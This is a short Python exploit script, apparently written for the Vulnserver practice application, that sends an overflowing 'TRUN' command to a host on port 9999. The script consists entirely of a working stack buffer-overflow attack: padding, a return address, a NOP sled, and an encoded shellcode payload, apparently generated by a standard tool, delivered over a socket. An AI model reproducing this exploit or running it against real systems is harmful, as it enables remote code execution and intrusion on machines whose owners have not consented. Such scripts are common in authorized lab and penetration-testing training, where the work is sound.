#!/usr/bin/python3
import sys, socket

overflow= (b"\xdd\xc0\xd9\x74\x24\xf4\xba\xb5\xb2\xec\x14\x5d\x33\xc9\xb1"
b"\x52\x31\x55\x17\x83\xed\xfc\x03\xe0\xa1\x0e\xe1\xf6\x2e\x4c"
b"\x0a\x06\xaf\x31\x82\xe3\x9e\x71\xf0\x60\xb0\x41\x72\x24\x3d"
b"\x29\xd6\xdc\xb6\x5f\xff\xd3\x7f\xd5\xd9\xda\x80\x46\x19\x7d"
b"\x03\x95\x4e\x5d\x3a\x56\x83\x9c\x7b\x8b\x6e\xcc\xd4\xc7\xdd"
b"\xe0\x51\x9d\xdd\x8b\x2a\x33\x66\x68\xfa\x32\x47\x3f\x70\x6d"
b"\x47\xbe\x55\x05\xce\xd8\xba\x20\x98\x53\x08\xde\x1b\xb5\x40"
b"\x1f\xb7\xf8\x6c\xd2\xc9\x3d\x4a\x0d\xbc\x37\xa8\xb0\xc7\x8c"
b"\xd2\x6e\x4d\x16\x74\xe4\xf5\xf2\x84\x29\x63\x71\x8a\x86\xe7"
b"\xdd\x8f\x19\x2b\x56\xab\x92\xca\xb8\x3d\xe0\xe8\x1c\x65\xb2"
b"\x91\x05\xc3\x15\xad\x55\xac\xca\x0b\x1e\x41\x1e\x26\x7d\x0e"
b"\xd3\x0b\x7d\xce\x7b\x1b\x0e\xfc\x24\xb7\x98\x4c\xac\x11\x5f"
b"\xb2\x87\xe6\xcf\x4d\x28\x17\xc6\x89\x7c\x47\x70\x3b\xfd\x0c"
b"\x80\xc4\x28\x82\xd0\x6a\x83\x63\x80\xca\x73\x0c\xca\xc4\xac"
b"\x2c\xf5\x0e\xc5\xc7\x0c\xd9\x2a\xbf\x04\x13\xc3\xc2\x18\x32"
b"\x4e\x4a\xfe\x5e\x60\x1a\xa9\xf6\x19\x07\x21\x66\xe5\x9d\x4c"
b"\xa8\x6d\x12\xb1\x67\x86\x5f\xa1\x10\x66\x2a\x9b\xb7\x79\x80"
b"\xb3\x54\xeb\x4f\x43\x12\x10\xd8\x14\x73\xe6\x11\xf0\x69\x51"
b"\x88\xe6\x73\x07\xf3\xa2\xaf\xf4\xfa\x2b\x3d\x40\xd9\x3b\xfb"
b"\x49\x65\x6f\x53\x1c\x33\xd9\x15\xf6\xf5\xb3\xcf\xa5\x5f\x53"
b"\x89\x85\x5f\x25\x96\xc3\x29\xc9\x27\xba\x6f\xf6\x88\x2a\x78"
b"\x8f\xf4\xca\x87\x5a\xbd\xeb\x65\x4e\xc8\x83\x33\x1b\x71\xce"
b"\xc3\xf6\xb6\xf7\x47\xf2\x46\x0c\x57\x77\x42\x48\xdf\x64\x3e"
b"\xc1\x8a\x8a\xed\xe2\x9e")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.10.6',9999))
    
    s.send((b'TRUN /.:/' + shellcode))
    s.close()
    
except:
    print ("Error connecting to server.")
    sys.exit()
